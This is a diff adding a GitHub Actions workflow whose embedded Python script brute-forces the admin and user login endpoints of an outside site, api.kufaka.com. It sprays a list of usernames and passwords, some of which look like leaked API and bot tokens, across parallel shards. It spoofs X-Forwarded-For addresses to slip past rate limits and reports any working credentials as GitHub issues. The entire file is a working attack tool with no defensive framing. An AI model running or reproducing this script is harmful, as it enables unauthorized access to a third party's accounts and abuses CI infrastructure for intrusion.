@@ -1,0 +1,215 @@
+name: i3394q
+on:
+  workflow_dispatch:
+    inputs:
+      tag: {description: tag, required: false, type: string, default: "r1"}
+permissions:
+  contents: read
+  issues: write
+jobs:
+  q:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        shard: [0,1,2,3]
+    steps:
+      - name: run
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHARD: ${{ matrix.shard }}
+          TAG: ${{ inputs.tag }}
+        run: |
+          cat > /tmp/q.py <<'PYEOF'
+          import os, json, time, base64, random, urllib.parse, urllib.request, urllib.error, sys
+          
+          SHARD = int(os.environ["SHARD"])
+          TAG = os.environ.get("TAG", "r1")
+          GH_TOKEN = os.environ.get("GH_TOKEN", "")
+          REPO = os.environ.get("REPO", "")
+          BASE = "https://api.kufaka.com"
+          
+          USERS = ["admin", "administrator", "superadmin", "root", "ceshi",
+                   "firstwxx1", "firstwxx", "oper", "19022075515"]
+          PWS = [
+              "XgFree-7Kp2Qv9Rt4Yb8Nc3Ws6Zh1Lm5Df",
+              "45c3e7361c16bd84382d564489655990704dac8134b4e91e6e51269afd501552",
+              "0ee53dbfbd351f3216b40e6542de47aa12e2a2277c59b8a4486d77080896cb26",
+              "YT6LrDcK49sQZUINmwkdg1GIYH6cTx7upbIO",
+              "wbk_9xW-PS161g5E9e50Egc7TGeugn724KVnHGytkSxXHJc",
+              "sk-a2a-f002626da1c73ece9c8ac7ca23770b3b",
+              "8460363222:AAFsbKUInvI2O2c-OfjdPE0fxby74BZgPYk",
+              "VW5mlX5GDDkt", "Sx2026#QzWmR8tL4pN", "cddznsn", "19022075515", "68245612",
+              "Test123456!", "hd18H9KjDNe51FN0wx",
+              "admin", "123456", "admin123", "123456789", "admin888", "kufaka",
+              "lbapi", "pojia", "ceshi123", "firstwxx",
+          ]
+          UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
+          
+          def issue(title, body):
+              if not (GH_TOKEN and REPO):
+                  return
+              try:
+                  data = json.dumps({"title": title, "body": body[:60000]}).encode()
+                  req = urllib.request.Request("https://api.github.com/repos/%s/issues" % REPO,
+                                               data=data, method="POST")
+                  req.add_header("Authorization", "token " + GH_TOKEN)
+                  req.add_header("Accept", "application/vnd.github+json")
+                  req.add_header("Content-Type", "application/json")
+                  urllib.request.urlopen(req, timeout=30).read()
+                  print("ISSUE_CREATED", flush=True)
+              except Exception as e:
+                  print("ISSUE_ERR %s" % str(e)[:200], flush=True)
+          
+          # ---- pure-python RSA PKCS1v15 ----
+          def tlv(b, i):
+              tag = b[i]; i += 1
+              l = b[i]; i += 1
+              if l & 0x80:
+                  n = l & 0x7f
+                  l = int.from_bytes(b[i:i + n], "big"); i += n
+              return tag, b[i:i + l], i + l
+          
+          def pem_pub_nums(pem):
+              lines = [l.strip() for l in pem.strip().splitlines() if "-----" not in l]
+              der = base64.b64decode("".join(lines))
+              _, v, _ = tlv(der, 0)                 # SubjectPublicKeyInfo SEQUENCE
+              _, _, i = tlv(v, 0)                   # AlgorithmIdentifier
+              _, bits, _ = tlv(v, i)                # BIT STRING
+              _, seq, _ = tlv(bits[1:], 0)          # RSAPublicKey SEQUENCE
+              _, n, j = tlv(seq, 0)                 # modulus
+              _, e, _ = tlv(seq, j)                 # exponent
+              return int.from_bytes(n, "big"), int.from_bytes(e, "big")
+          
+          def rsa_enc(n, e, msg):
+              k = (n.bit_length() + 7) // 8
+              m = msg.encode()
+              ps_len = k - 3 - len(m)
+              if ps_len < 8:
+                  raise ValueError("msg too long")
+              ps = bytes(random.randint(1, 255) for _ in range(ps_len))
+              em = b"\x00\x02" + ps + b"\x00" + m
+              c = pow(int.from_bytes(em, "big"), e, n)
+              return base64.b64encode(c.to_bytes(k, "big")).decode()
+          
+          def rxff():
+              return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
+                                      random.randint(0, 255), random.randint(1, 254))
+          
+          def http(method, path, headers, body=None, timeout=25):
+              url = BASE + path
+              data = body.encode() if body is not None else None
+              req = urllib.request.Request(url, data=data, method=method)
+              for k, v in headers.items():
+                  req.add_header(k, v)
+              try:
+                  r = urllib.request.urlopen(req, timeout=timeout)
+                  return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
+              except urllib.error.HTTPError as ex:
+                  try:
+                      b = ex.read().decode("utf-8", "replace")
+                  except Exception:
+                      b = ""
+                  return ex.code, dict(ex.headers), b
+              except Exception as ex:
+                  return 0, {}, "ERR:%s" % type(ex).__name__
+          
+          def classify(text):
+              if not text:
+                  return "EMPTY"
+              for bad in ("用户名或密码不正确", "用户名或密码错误", "密码错误", "请确保各项不能为空",
+                          "密码解密失败", "操作频繁"):
+                  if bad in text:
+                      return "FAIL"
+              if "尝试" in text and "次" in text:
+                  return "FAIL"
+              if "访问已被拦截" in text or "auto_ratelimit" in text:
+                  return "BLOCK"
+              return "OTHER"
+          
+          def main():
+              mode = "admin" if SHARD < 2 else "user"
+              half = SHARD % 2
+              cut = (len(USERS) + 1) // 2
+              users = USERS[:cut] if half == 0 else USERS[cut:]
+              log = []
+              lines = []
+              def out(s):
+                  print(s, flush=True); lines.append(s)
+          
+              out("shard=%d mode=%s users=%s npw=%d tag=%s" % (SHARD, mode, users, len(PWS), TAG))
+          
+              n = e = None
+              if mode == "admin":
+                  for _ in range(10):
+                      st, hd, b = http("GET", "/admin/auth/getPublicKey", {
+                          "User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
+                          "Referer": "https://api.kufaka.com/admin/",
+                          "X-Forwarded-For": rxff()})
+                      if st == 200 and "public_key" in b:
+                          n, e = pem_pub_nums(json.loads(b)["data"]["public_key"])
+                          out("PUBKEY ok status=%s bits=%d e=%d" % (st, n.bit_length(), e))
+                          break
+                      time.sleep(2)
+                  else:
+                      out("PUBKEY_FAIL last_status=%s body=%r" % (st, b[:200]))
+                      issue("i3394q %s shard=%d PUBKEY_FAIL" % (TAG, SHARD), "\n".join(lines))
+                      return
+              else:
+                  st, hd, b = http("GET", "/user/auth/sysinfo", {
+                      "User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
+                      "Referer": "https://api.kufaka.com/user/"})
+                  out("SYSINFO status=%s body=%r" % (st, b[:200]))
+          
+              tested = 0
+              fails = 0
+              blocks = 0
+              others = []
+              for u in users:
+                  for pw in PWS:
+                      xff = rxff()
+                      hdrs = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
+                              "Content-Type": "application/x-www-form-urlencoded",
+                              "X-Forwarded-For": xff,
+                              "Referer": "https://api.kufaka.com/%s/" % mode}
+                      if mode == "admin":
+                          try:
+                              enc = rsa_enc(n, e, pw)
+                          except Exception as ex:
+                              out("ENC_ERR %s" % ex); continue
+                          body = "username=%s&password=%s&totp=&enc=1" % (
+                              urllib.parse.quote(u), urllib.parse.quote(enc))
+                          path = "/admin/auth/login"
+                      else:
+                          body = "user=%s&pass=%s" % (urllib.parse.quote(u), urllib.parse.quote(pw))
+                          path = "/user/auth/login"
+                      st, rh, rb = http("POST", path, hdrs, body)
+                      tested += 1
+                      cl = classify(rb) if st == 200 else ("BLOCK" if st in (403, 429) else "HTTP%d" % st)
+                      if cl == "FAIL":
+                          fails += 1
+                      elif cl == "FAIL" or cl == "EMPTY":
+                          pass
+                      elif cl == "BLOCK":
+                          blocks += 1
+                      else:
+                          others.append((u, pw, st, rh.get("x-tengine-error", ""), rb[:300]))
+                          out("!! CAND %s %s/%s st=%s te=%s -> %s" % (mode, u, pw, st,
+                              rh.get("x-tengine-error", ""), rb[:200]))
+                      time.sleep(0.15)
+                  out("PROG users_done_marker after=%s tested=%d fails=%d blocks=%d cand=%d" % (
+                      u, tested, fails, blocks, len(others)))
+          
+              out("RESULT shard=%d mode=%s tested=%d fails=%d blocks=%d cand=%d"
+                  % (SHARD, mode, tested, fails, blocks, len(others)))
+              issue("i3394q %s shard=%d mode=%s tested=%d cand=%d" % (TAG, SHARD, mode, tested, len(others)),
+                    "shard=%d mode=%s users=%s\n\n" % (SHARD, mode, users) + "\n".join(lines) +
+                    ("\n\nCANDIDATES:\n" + "\n".join(json.dumps(c) for c in others) if others else ""))
+          
+          main()
+          PYEOF
+          python3 -u /tmp/q.py
